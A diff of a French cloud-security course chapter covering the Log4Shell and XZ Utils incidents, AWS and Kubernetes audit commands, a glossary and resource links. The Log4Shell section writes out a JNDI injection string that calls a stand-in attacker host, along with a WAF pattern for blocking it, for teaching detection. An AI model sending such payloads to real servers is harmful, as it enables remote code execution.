@@ -33,7 +33,7 @@ title: "16. Cas réels : incidents cloud majeurs"
 | Mécanisme de la vulnérabilité | Détection et réponse |
 | --- | --- |
 | •  Log4j2 interprète les expressions JNDI (${jndi:ldap://...}) dans les<br>chaînes loguées<br>•  Un attaquant envoie ${jndi:ldap://attacker.com/exploit} dans un<br>champ logué (User-Agent, etc.)<br>•  Log4j2 fait une requête LDAP vers le serveur attaquant<br>•  Le serveur attaquant répond avec une classe Java malveillante<br>•  Log4j2 charge et exécute cette classe → RCE complète sur le serveur<br>•  Exploitation en <1 ligne · Détection initiale très difficile | •  WAF : bloquer les patterns ${jndi: dans tous les inputs HTTP<br>•  Network : bloquer les connexions LDAP/RMI sortantes non autorisées<br>•  Scanner : log4j-detector (Lunasec) · log4shell-detector · Huntress Log4Shell<br>Tester<br>•  Mitigation immédiate : LOG4J_FORMAT_MSG_NO_LOOKUPS=true (env var)<br>•  Correction permanente : upgrader vers Log4j 2.17.1+<br>•  SBOM : aurait permis de lister instantanément tous les services affectés |
-| # Scanner toutes les images Docker pour Log4Shell<br># Option 1 : Grype (Anchore)<br>grype sbom:./sbom.json \| grep log4j<br># Option 2 : Trivy<br>trivy fs --severity CRITICAL --vuln-type library . un SBOM aurait permis de répondre à 'quels services utilisent<br>trivy image myapp:latest \| grep CVE-2021-44228<br>Log4j ?' en quelques secondes vs. jours d'investigation<br># Option 3 : log4j-detector (Lunasec)<br>java -jar log4j-detector.jar /opt/myapp /var/lib<br># Dans la CI/CD (GitHub Actions) :<br>- uses: anchore/scan-action@v3<br>with: { image: "myapp:latest", fail-build: "true", severity-cutoff: "critical" }<br>3 |  |
+| # Scanner toutes les images Docker pour Log4Shell<br># Option 1 : Grype (Anchore)<br>grype sbom:./sbom.json \| grep log4j<br># Option 2 : Trivy<br>trivy fs --severity CRITICAL --vuln-type library . un SBOM aurait permis de répondre à 'quels services utilisent<br>trivy image myapp:latest \| grep CVE-2021-44228<br>Log4j ?' en quelques secondes vs. jours d'investigation<br># Option 3 : log4j-detector (Lunasec)<br>java -jar log4j-detector.jar /opt/myapp /var/lib<br># Dans la CI/CD (GitHub Actions) :<br>- uses: anchore/scan-action@v3<br>with: { image: "myapp:latest", fail-build: "true", severity-cutoff: "critical" } |  |
 
 
 ## XZ Utils backdoor : Social engineering avancé (avril 2024)
@@ -44,29 +44,27 @@ Backdoor dans xz/liblzma (dépendance SSH sur Debian/Ubuntu/Fedora) · Découver
 | --- | --- |
 | •  Juin 2021 : création du compte GitHub 'JiaT75' (fausse identité<br>soigneusement construite)<br>•  2022-2023 : contributions légitimes de qualité au projet xz pour gagner la<br>confiance du mainteneur<br>•  Fin 2023 : harcèlement coordonné du mainteneur principal (burn-out<br>orchestré) pour forcer une prise en charge<br>•  Jan-Fév 2024 : injection du backdoor dans les versions 5.6.0 et 5.6.1 de<br>xz/liblzma<br>•  Mars 2024 : Andres Freund (Microsoft) remarque une anomalie de 500ms<br>dans SSH via un benchmark perf → découverte<br>•  5 Avril 2024 : CVE-2024-3094 publiée (CVSS 10.0) : urgence nationale aux US | •  Le backdoor est injecté uniquement dans les tarballs de release (pas<br>dans Git directement)<br>•  Il cible spécifiquement sshd via la chaîne : xz → liblzma → systemd →<br>sshd<br>•  Objectif : permettre à l'attaquant de s'authentifier SSH sans credentials<br>valides<br>•  Détection ratée par : checksum du tarball valide (le code est dans les<br>tests !) · CI/CD ne scannait que Git<br>•  Impact potentiel : accès root sur des millions de serveurs Linux<br>mondiaux |
 | Leçons pour les équipes DevSecOps |  |
-| •  Reproduire les builds (reproducible builds)<br>•  Comparer le tarball au source Git / Scanner les tarballs et les sources<br>•  Vérifier l'intégrité des dépendances open source<br>•  Revues de code humaines sur les contributions critiques<br>•  SBOM avec sources vérifiées<br>•  Alertes sur changements de mainteneurs de projets critiques<br>3 |  |
+| •  Reproduire les builds (reproducible builds)<br>•  Comparer le tarball au source Git / Scanner les tarballs et les sources<br>•  Vérifier l'intégrité des dépendances open source<br>•  Revues de code humaines sur les contributions critiques<br>•  SBOM avec sources vérifiées<br>•  Alertes sur changements de mainteneurs de projets critiques |  |
 
 
 ## Sécurité de la CLI AWS
 
 
-| IAM : Audit et investigation | S3 : Sécurité des buckets |  |
-| --- | --- | --- |
-| aws iam generate-credential-report && aws iam<br>get-credential-report \| base64 -d<br>aws iam list-users --query 'Users[?PasswordLastUsed==`null`]' #<br>users jamais connectés<br>aws iam list-access-keys --user-name USERNAME # lister les clés<br>d'un user<br>aws iam simulate-principal-policy --policy-source-arn ARN<br>--action-names 's3:*' # tester permissions | aws s3api get-bucket-acl --bucket BUCKET # vérifier les ACLs<br>aws s3api get-public-access-block --bucket BUCKET # état Block<br>Public Access<br>aws s3api put-public-access-block --bucket BUCKET<br>--public-access-block-configuration<br>'BlockPublicAcls=true,BlockPublicPolicy=true,IgnorePublicAcls=true,<br>RestrictPublicBuckets=true'<br>aws s3api get-bucket-encryption --bucket BUCKET # vérifier le<br>chiffrement |  |
-| GuardDuty : Findings | CloudTrail : Logs forensiques |  |
-| aws guardduty list-findings --detector-id ID # lister tous les<br>findings<br>aws guardduty get-findings --detector-id ID --finding-ids ID1<br>ID2 # détail<br>aws guardduty create-sample-findings --detector-id ID # générer<br>des findings de test<br>aws guardduty list-detectors # trouver l'ID du détecteur | •  aws cloudtrail lookup-events --lookup-attributes<br>AttributeKey=Username,AttributeValue=root # events root<br>•  aws cloudtrail lookup-events --start-time 2024-01-01 --query<br>'Events[?EventName==`ConsoleLogin`]'<br>•  aws cloudtrail get-trail-status --name TRAIL_NAME #<br>vérifier si actif<br>•  aws logs filter-log-events --log-group-name CloudTrail/logs<br>--filter-pattern 'errorCode' |  |
-|  |  | 3 |
+| IAM : Audit et investigation | S3 : Sécurité des buckets |
+| --- | --- |
+| aws iam generate-credential-report && aws iam<br>get-credential-report \| base64 -d<br>aws iam list-users --query 'Users[?PasswordLastUsed==`null`]' #<br>users jamais connectés<br>aws iam list-access-keys --user-name USERNAME # lister les clés<br>d'un user<br>aws iam simulate-principal-policy --policy-source-arn ARN<br>--action-names 's3:*' # tester permissions | aws s3api get-bucket-acl --bucket BUCKET # vérifier les ACLs<br>aws s3api get-public-access-block --bucket BUCKET # état Block<br>Public Access<br>aws s3api put-public-access-block --bucket BUCKET<br>--public-access-block-configuration<br>'BlockPublicAcls=true,BlockPublicPolicy=true,IgnorePublicAcls=true,<br>RestrictPublicBuckets=true'<br>aws s3api get-bucket-encryption --bucket BUCKET # vérifier le<br>chiffrement |
+| GuardDuty : Findings | CloudTrail : Logs forensiques |
+| aws guardduty list-findings --detector-id ID # lister tous les<br>findings<br>aws guardduty get-findings --detector-id ID --finding-ids ID1<br>ID2 # détail<br>aws guardduty create-sample-findings --detector-id ID # générer<br>des findings de test<br>aws guardduty list-detectors # trouver l'ID du détecteur | •  aws cloudtrail lookup-events --lookup-attributes<br>AttributeKey=Username,AttributeValue=root # events root<br>•  aws cloudtrail lookup-events --start-time 2024-01-01 --query<br>'Events[?EventName==`ConsoleLogin`]'<br>•  aws cloudtrail get-trail-status --name TRAIL_NAME #<br>vérifier si actif<br>•  aws logs filter-log-events --log-group-name CloudTrail/logs<br>--filter-pattern 'errorCode' |
 
 
 ## Sécurité de Kubernetes
 
 
-| RBAC : Audit des droits | Pods : Détection de mauvaises configs |  |
-| --- | --- | --- |
-| kubectl auth can-i --list<br>--as=system:serviceaccount:default:mysa # ce que le SA peut<br>faire<br>kubectl get rolebindings,clusterrolebindings --all-namespaces -o<br>wide \| grep -v system:<br>kubectl get pods --all-namespaces -o json \| jq<br>'.items[].spec.serviceAccountName' # SA par pod<br>kubectl describe clusterrolebinding cluster-admin # qui a les<br>droits admin ? | kubectl get pods --all-namespaces -o json \| jq '.items[] \|<br>select(.spec.securityContext.runAsRoot==true)'<br>kubectl get pods -o json \| jq '.items[] \|<br>select(.spec.hostNetwork==true)' # pods avec hostNetwork<br>kubectl get pods -o json \| jq '.items[] \|<br>select(.spec.containers[].securityContext.privileged==true)'<br>kubectl get secrets --all-namespaces \| grep -v kubernetes.io #<br>secrets custom |  |
-| GuardDuty : Findings | Falco : Détection runtime |  |
-| kubectl get networkpolicies --all-namespaces # lister toutes<br>les network policies<br>kubectl describe networkpolicy default-deny -n production #<br>détail d'une policy<br># Namespaces sans network policy (dangereux) :<br>for ns in $(kubectl get ns -o<br>jsonpath='{.items[*].metadata.name}'); do echo $ns: $(kubectl<br>get networkpolicy -n $ns 2>/dev/null \| wc -l) policies; done | helm install falco falcosecurity/falco -n falco --create-namespace<br># installation<br>kubectl logs -l app=falco -n falco --tail=50 -f # suivre les<br>alertes<br>kubectl exec -it falco-pod -n falco -- falco --list \| grep shell #<br>règles disponibles<br># Test : spawner un shell dans un pod (doit déclencher Falco) :<br>kubectl exec -it mypod -- /bin/bash # → alerte Falco dans les logs |  |
-|  |  | 3 |
+| RBAC : Audit des droits | Pods : Détection de mauvaises configs |
+| --- | --- |
+| kubectl auth can-i --list<br>--as=system:serviceaccount:default:mysa # ce que le SA peut<br>faire<br>kubectl get rolebindings,clusterrolebindings --all-namespaces -o<br>wide \| grep -v system:<br>kubectl get pods --all-namespaces -o json \| jq<br>'.items[].spec.serviceAccountName' # SA par pod<br>kubectl describe clusterrolebinding cluster-admin # qui a les<br>droits admin ? | kubectl get pods --all-namespaces -o json \| jq '.items[] \|<br>select(.spec.securityContext.runAsRoot==true)'<br>kubectl get pods -o json \| jq '.items[] \|<br>select(.spec.hostNetwork==true)' # pods avec hostNetwork<br>kubectl get pods -o json \| jq '.items[] \|<br>select(.spec.containers[].securityContext.privileged==true)'<br>kubectl get secrets --all-namespaces \| grep -v kubernetes.io #<br>secrets custom |
+| GuardDuty : Findings | Falco : Détection runtime |
+| kubectl get networkpolicies --all-namespaces # lister toutes<br>les network policies<br>kubectl describe networkpolicy default-deny -n production #<br>détail d'une policy<br># Namespaces sans network policy (dangereux) :<br>for ns in $(kubectl get ns -o<br>jsonpath='{.items[*].metadata.name}'); do echo $ns: $(kubectl<br>get networkpolicy -n $ns 2>/dev/null \| wc -l) policies; done | helm install falco falcosecurity/falco -n falco --create-namespace<br># installation<br>kubectl logs -l app=falco -n falco --tail=50 -f # suivre les<br>alertes<br>kubectl exec -it falco-pod -n falco -- falco --list \| grep shell #<br>règles disponibles<br># Test : spawner un shell dans un pod (doit déclencher Falco) :<br>kubectl exec -it mypod -- /bin/bash # → alerte Falco dans les logs |
 
 
 ## Sécurité Terraform et IaC
@@ -98,38 +96,25 @@ Backdoor dans xz/liblzma (dépendance SSH sur Debian/Ubuntu/Fedora) · Découver
 ## De G à Z : Termes et acronymes essentiels
 
 
-| SBOM | Software Bill of Materials : inventaire exhaustif des<br>composants logiciels (format SPDX ou CycloneDX) | STS | Security Token Service (AWS) : service émettant des<br>credentials temporaires via AssumeRole / OIDC /<br>SAML |  |
-| --- | --- | --- | --- | --- |
-| SIEM | Security Information & Event Management :<br>centralisation, normalisation, corrélation des logs<br>et alertes sécurité | UEBA | User & Entity Behavior Analytics : détection<br>d’anomalies comportementales par ML pour<br>utilisateurs et systèmes |  |
-| SOAR | Security Orchestration, Automation & Response :<br>automatisation des workflows de réponse aux<br>incidents sécurité | VPC | Virtual Private Cloud : réseau virtuel isolé dans le<br>cloud provider (AWS VPC, Azure VNet, GCP VPC) |  |
-| SOC | Security Operations Center : équipe dédiée à la<br>surveillance, détection et réponse aux incidents<br>24/7 | ZTNA | Zero Trust Network Access : accès réseau basé sur<br>l’identité et le contexte, remplace le VPN traditionnel |  |
-| SSRF | Server-Side Request Forgery : vulnérabilité<br>permettant de forger des requêtes depuis le<br>serveur (ex : vers IMDS) |  |  |  |
-|  |  |  |  | 3 |
+| SBOM | Software Bill of Materials : inventaire exhaustif des<br>composants logiciels (format SPDX ou CycloneDX) | STS | Security Token Service (AWS) : service émettant des<br>credentials temporaires via AssumeRole / OIDC /<br>SAML |
+| --- | --- | --- | --- |
+| SIEM | Security Information & Event Management :<br>centralisation, normalisation, corrélation des logs<br>et alertes sécurité | UEBA | User & Entity Behavior Analytics : détection<br>d’anomalies comportementales par ML pour<br>utilisateurs et systèmes |
+| SOAR | Security Orchestration, Automation & Response :<br>automatisation des workflows de réponse aux<br>incidents sécurité | VPC | Virtual Private Cloud : réseau virtuel isolé dans le<br>cloud provider (AWS VPC, Azure VNet, GCP VPC) |
+| SOC | Security Operations Center : équipe dédiée à la<br>surveillance, détection et réponse aux incidents<br>24/7 | ZTNA | Zero Trust Network Access : accès réseau basé sur<br>l’identité et le contexte, remplace le VPN traditionnel |
+| SSRF | Server-Side Request Forgery : vulnérabilité<br>permettant de forger des requêtes depuis le<br>serveur (ex : vers IMDS) |  |  |
 
 
-| Ressources pour aller plus loin |  |
-| --- | --- |
-| •  Standards & frameworks<br>  ◦  https://attack.mitre.org : MITRE ATT&CK for Cloud (tactiques + techniques + navigator)<br>  ◦  https://owasp.org/Top10/2025 : OWASP Cloud Security Top 10<br>  ◦  https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf : NIST Zero Trust Architecture<br>  ◦  https://cloudsecurityalliance.org/artifacts/cloud-controls-matrix-v4-1 : CSA CCM v4<br>•  Formation & certifications<br>  ◦  https://www.aws.training/ : AWS Security Learning Path (gratuit)<br>  ◦  https://learn.microsoft.com/fr-fr/credentials/certifications/resources/study-guides/sc-200 : Préparation de la<br>certification Microsoft SC-200<br>  ◦  https://www.coursera.org/specializations/ccsp-exam-prep : Préparation de la certification CCSP (ISC²)<br>  ◦  https://tryhackme.com/path/outline/soclevel1 : SOC niveau 1<br>  ◦  https://portswigger.net/web-security/all-labs : Web Security Academy<br>•  Veille sécurité cloud<br>  ◦  https://www.sysdig.com/blog : blog de la société Sysdig<br>  ◦  https://www.wiz.io/blog : CNAPP & menaces cloud<br>  ◦  https://cloudsecurityalliance.org : Recherche CSA<br>  ◦  https://krebsonsecurity.com : Actualités sécurité<br>  ◦  https://therecord.media : Actualités sécurité<br>3 |  |
-|  | 3 |
-
-| https://attack.mitre.org |  |
-| --- | --- |
 | https://owasp.org/Top10/202 | 5 |
+| --- | --- |
 | https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf |  |
 | https://cloudsecurityalliance.org/artifacts/cloud-controls-matrix-v4-1 |  |
 
-| https://www.aws.training/ |
-| --- |
-| https://learn.microsoft.com/fr-fr/credentials/certifications/resources/study-guides/sc-200 |
-
-| https://www.coursera.org/specializations/ccsp-exam-prep |
-| --- |
 | https://tryhackme.com/path/outline/soclevel1 |
+| --- |
 | https://portswigger.net/web-security/all-labs |
 
-| https://www.sysdig.com/blog |
-| --- |
 | https://www.wiz.io/blog |
+| --- |
 | https://cloudsecurityalliance.org |
 | https://krebsonsecurity.com |
 | https://therecord.media |
